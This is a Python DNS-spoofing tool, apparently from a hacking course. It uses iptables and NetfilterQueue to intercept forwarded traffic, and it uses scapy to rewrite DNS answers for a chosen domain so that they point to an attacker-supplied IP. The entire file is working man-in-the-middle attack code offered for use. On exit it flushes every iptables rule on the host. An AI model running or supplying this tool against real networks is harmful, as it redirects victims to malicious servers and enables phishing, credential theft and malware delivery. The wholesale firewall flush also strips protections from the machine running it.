#!/usr/bin/env python

import netfilterqueue
import subprocess
import scapy.all as scapy
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_domain", help="Target domain name")
    parser.add_argument("-i", "--destination-ip", dest="dest_ip", help="IP of where you want to redirect the target")
    options = parser.parse_args()
    if not options.target_domain:
        print("[-] Please specify target domain name, use --help for more info")
        return
    if not options.dest_ip:
        print("[-] Please specify the destination ip address, use --help for more info")
        return
    return options


def initialize_queue():
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])


def flush_queue():
    subprocess.call(["iptables", "--flush"])


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if options.target_domain in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata=options.dest_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            packet.set_payload(str(scapy_packet))
    packet.accept()


options = get_arguments()

if not options.target_domain:
    exit()
if not options.dest_ip:
    exit()

initialize_queue()

try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("[+] Exiting Spoofing Mode...")
    flush_queue()
